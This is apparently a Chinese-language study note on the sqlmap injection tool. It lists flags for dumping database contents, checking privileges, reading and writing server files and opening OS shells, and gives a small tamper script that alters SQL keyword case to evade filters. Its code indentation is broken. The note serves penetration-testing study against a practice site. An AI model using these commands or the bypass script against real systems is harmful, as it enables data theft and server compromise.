
---
![[sqlmap.jpg]]

**参考：**
https://www.cnblogs.com/bmjoker/p/9326258.html

**数据猜解-库表列数据** 
字典
测试：http://vulnweb.com/

```
	--current-db

	--tables -D ""

	--columns -T "" -D ""

	--dump -C "" -T "" -D ""
```

**权限操作**
文件&命令&交互式
测试：MYSQL高权限注入

引出权限：

```
	--is-dba 查看当前用户是否为admin
	--privileges 查看当前用户权限
```
引出文件：

```
	--file-read 文件读取
	--file-write 文件写入
	 --file-write
	 本地文件路径 --file-dest 网站路径(写入路径)+"/写入的文件名
```
引出命令：

```
	--os-cmd
	cmd命令台
	--os-shell
	powershell命令 
	--sql-shell
	sql命令台

```
**提交方法**

POST&HEAD&JSON

测试：Post Cookie Json

```
	使用的sqlmap自带的请求头
	--data ""
	
	设置cookie
	--cookie ""
	
	post发送txt文件中数据包
	-r 1.txt
```

**绕过模块-Tamper脚本**

使用&开发
测试：base64注入 有过滤的注入

	
> [!将pyload自动转换成base64格式的模块]
> 	--tamper=base64encode.py

	--tamper=test.py
自己写绕过模板

```python
from lib.core.enums import PRIORITY
	__priority__ = PRIORITY.LOW
	
	def dependencies():
	pass
	
	def tamper(payload, **kwargs):
	if payload:
	payload = payload.replace('SELECT','sElEct')
	payload = payload.replace('OR','Or')
	payload = payload.replace('AND','And')
	payload = payload.replace('SLEEP','SleeP')
	payload = payload.replace('ELT','Elt')
	return payload
```

**分析拓展-代理**
调试&指纹&风险&等级

1、后期分析调试：

详细的等级(0-6)

	-v=(0-6) 
代理注入

	--proxy "http://xx:xx" 

2、打乱默认指纹：

```
	--user-agent "" #自定义user-agent

	--random-agent #随机user-agent

	--time-sec=(2,5) #延迟响应，默认为5
```

3、使用更多的测试

测试Header注入

```
	--level=(1-5) #要执行的测试水平等级，默认为1

	--risk=(0-3) #测试执行的风险等级，默认为1
```